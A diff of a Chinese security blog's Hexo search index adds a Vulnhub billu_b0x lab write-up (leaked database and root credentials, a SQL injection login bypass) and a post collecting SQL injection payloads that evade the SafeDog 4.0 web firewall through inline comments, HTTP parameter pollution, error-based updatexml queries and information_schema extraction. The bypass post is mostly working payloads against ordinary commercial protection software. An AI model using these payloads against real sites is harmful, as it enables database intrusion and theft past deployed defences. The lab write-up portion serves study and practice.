@@ -2670,11 +2670,7 @@ $R=$Z('',$X);$R();
 <p>没扫出来注入点</p>
 <br/>
 
-<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>传一个图片马试试</p>
-<p>！！！！！！</p>
-<hr>
-<br/>
-
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>传一个图片马试试，或许后面会用到</p>
 <br/>
 
 <h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>在<code>test.php</code>get请求 传参 <code>?file=/etc/passwd</code>没反应</p>
@@ -2688,8 +2684,21 @@ $R=$Z('',$X);$R();
 <p>发现一个<code>ica</code>的用户，可以登录ssh</p>
 <br/>
 
+
 <p>同时用这种方法去下载<code>add.php</code>,<code>in.php</code> <code>index.php</code> <code>test.php</code> <code>show.php</code> <code>c.php</code></p>
-<p>并进行审计</p>
+<p><img src="addphp.png"><br>在add.php中有文件上传的代码，没有经过任何处理，可以考虑去上传图片马在in.php中是phpinfo信息</p>
+<h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h5><p><img src="cphp.png"><br>在c.php中发现了mysql数据库的账户信息<code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p>
+<blockquote>
+<p>用户名 billu密码 b0x_billu数据库名 ica_lab</p>
+</blockquote>
+<p>使用这个账户去尝试登录phpmyadmin，成功登录,并得到phpmyadmin版本为3.4.7登录后台思路一 使用phpmyadmin中账号<br><img src="auth.png"><br>在anth表中得到一个账户 biLLu hEx_it使用此账户成功登录到后台</p>
+<h5 id="思路二-SQL注入再尝试查看index-php的源码"><a href="#思路二-SQL注入再尝试查看index-php的源码" class="headerlink" title="思路二 SQL注入再尝试查看index.php的源码"></a>思路二 SQL注入再尝试查看index.php的源码</h5><p><img src="sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>前面使用str_replace 将单引号全部过滤掉了，<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>输入<code>pass=admin\   uname= or 1=1 --+</code><br>即 <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>成功登录文件上传<br><img src="login.png"><br>审计一下panel.php<br>页面有两个功能 show users 和 add users 对于文件上传使用了白名单机制，只允许上传<code>jpeg,jpg,gif,png</code><br>当要上传一张图片是，会先判断后缀名是否正确，如果正确，还有一个mime验证<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>可以看到上传图片的路径为uploaded_images/</p>
+<p>这里传马多次都没传成功，有时间再试试吧….</p>
+<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="download_phpmyconf.png"><br><img src="phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#x31;&#56;&#46;&#49;&#52;&#x34;">&#114;&#x6f;&#111;&#x74;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#x31;&#56;&#46;&#49;&#52;&#x34;</a>成功登录root用户</p>
+<p>Reference</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
+</blockquote>
 ]]></content>
       <categories>
         <category>vulhub</category>
@@ -2704,35 +2713,31 @@ $R=$Z('',$X);$R();
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>安全狗绕过</title>
+    <title>安全狗4.0 sqli绕过</title>
     <url>/posts/d405928/</url>
     <content><![CDATA[<h4 id="and-1-1-绕过"><a href="#and-1-1-绕过" class="headerlink" title="and 1=1 绕过"></a>and 1=1 绕过</h4><p><img src="1.png"></p>
-<p>正常使用 <code>?id=tom&#39; and 1=1 --+</code>会被拦截</p>
-<p><img src="2.png"></p>
-<h5 id="使用-amp-amp-替换and"><a href="#使用-amp-amp-替换and" class="headerlink" title="使用&amp;&amp;替换and"></a>使用<code>&amp;&amp;</code>替换and</h5><p><img src="3.png"></p>
-<p>无法绕过</p>
+<p>正常使用 <code>?id=tom&#39; and 1=1 --+</code>会被拦截<br><img src="2.png"></p>
+<h5 id="使用-amp-amp-替换and"><a href="#使用-amp-amp-替换and" class="headerlink" title="使用&amp;&amp;替换and"></a>使用<code>&amp;&amp;</code>替换and</h5><p><img src="3.png"><br>无法绕过</p>
 <h5 id="使用内联注释-！11440"><a href="#使用内联注释-！11440" class="headerlink" title="使用内联注释/*！11440 */"></a>使用内联注释<code>/*！11440 */</code></h5><p><img src="4.png"></p>
-<p><img src="8.png"></p>
-<p>可以绕过</p>
-<br/>
-
+<p><img src="8.png"><br>可以绕过<br><br/></p>
 <h5 id="继续使用and"><a href="#继续使用and" class="headerlink" title="继续使用and"></a>继续使用and</h5><p>and 0x1</p>
 <p>可以使用十六进制绕过</p>
 <br/>
-
+##### http参数污染
+![](14.png)
 <br/>
 
+<hr>
 <br/>
 
 <br/>
 
 <h4 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h4><h5 id="使用换行符和注释绕过"><a href="#使用换行符和注释绕过" class="headerlink" title="使用换行符和注释绕过"></a>使用换行符和注释绕过</h5><p><code>?name=tom&#39;/**/order/*/%0A*/by/**/3%23</code></p>
-<p><img src="6.png"></p>
-<p><img src="7.png"></p>
+<p><img src="6.png"><br><img src="7.png"></p>
+<h5 id="使用http参数污染"><a href="#使用http参数污染" class="headerlink" title="使用http参数污染"></a>使用http参数污染</h5><p><code>name=tom1&#39; /*&amp;name=tom&#39; order by 3%23*/</code><br><img src="http1.png"><br><img src="http2.png"></p>
 <br/>
 
-<br/>
-
+<hr>
 <h4 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h4><h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><p>尝试使用<code>?id=tom&#39; union/*!11440select*/ 1,2,3 --+</code></p>
 <p>fuzz跑了下10000-99999都无法绕过</p>
 <p><img src="5.png"></p>
@@ -2747,37 +2752,77 @@ $R=$Z('',$X);$R();
 <p>fuzz一下，发现91625以后的都可以绕过</p>
 <p><img src="11.png"></p>
 <p><img src="12.png"></p>
+<h5 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,2,3%23*/</code></p>
+<p><img src="http3.png"></p>
+<p><img src="http4.png"></p>
 <br/>
 
+<hr>
 <h5 id="database-、user-绕过"><a href="#database-、user-绕过" class="headerlink" title="database()、user()绕过"></a>database()、user()绕过</h5><p><code>databse/*!91624*/()`` </code>user/!<em>99999</em>/()``</p>
+<br/>
+
 <p>这里也可以通过内联注释 中间数字没试 随便输入了几个</p>
 <p><img src="13.png"></p>
 <br/>
 
+<hr>
+<h4 id="information-schema绕过"><a href="#information-schema绕过" class="headerlink" title="information_schema绕过"></a>information_schema绕过</h4><h5 id="使用内联注释-fuzz"><a href="#使用内联注释-fuzz" class="headerlink" title="使用内联注释+fuzz"></a>使用内联注释+fuzz</h5><p>没绕过</p>
+<h5 id="利用http参数污染"><a href="#利用http参数污染" class="headerlink" title="利用http参数污染"></a>利用http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),user()%23*/</code></p>
+<p><img src="http5.png"></p>
+<br/>
+
+<hr>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="内联注释-fuzz"><a href="#内联注释-fuzz" class="headerlink" title="内联注释+fuzz"></a>内联注释+fuzz</h5><p>updatexml</p>
+<p>无waf情况下</p>
+<p><img src="baocuo1.pmg"></p>
+<p>开启安全狗</p>
+<p><img src="baocuo2.png"></p>
+<p>updataxml()会被拦截，中间加内联注释可以绕过</p>
+<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select database/*!99999*/()),0x7e),1) --+</code></p>
+<p><img src="baocuo3.png"></p>
+<p>但是</p>
+<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select/*!99999aaa*/database/*!99999*/()),0x7e),1) --+</code>会被拦截</p>
+<p>测试了下 <code>select from ...</code> 后面加东西就会被拦截</p>
+<p>在from 后面添加 <code>%23%0a</code>可以绕过</p>
+<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select name from%23%0A%20 test ),0x7e),1) --+</code></p>
+<p><img src="baocuo4.png"></p>
+<br/>
+
+<h5 id="http参数污染-1"><a href="#http参数污染-1" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)%23*/</code></p>
+<p><img src="http6.png"></p>
+<p><img src="http7.png"></p>
+<br/>
+
+<hr>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="http参数污染-2"><a href="#http参数污染-2" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><img src="http_sleep.png"></p>
+<p><img src="bool1.png"> </p>
+<p><img src="bool2.png"></p>
 <br/>
 
 <br/>
 
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<br/>
-
-<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><blockquote>
-<p><a href="https://xz.aliyun.com/t/7578">https://xz.aliyun.com/t/7578</a></p>
-<p><a href="https://my.oschina.net/u/4808922/blog/4739857">https://my.oschina.net/u/4808922/blog/4739857</a></p>
-</blockquote>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在此版本的安全狗(4.0.23.13)中，利用<strong>http参数污染</strong>都可以绕过</p>
+<p>有些也可以使用<strong>内联注释</strong>+<strong>fuzz</strong>+<strong>换行符</strong>进行绕过</p>
 ]]></content>
       <categories>
         <category>waf</category>
+        <category>SQLi</category>
       </categories>
       <tags>
+        <tag>SQLi</tag>
         <tag>waf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo设置多个标签或分类</title>
+    <url>/posts/d7c641b4/</url>
+    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
+]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
       </tags>
   </entry>
 </search>
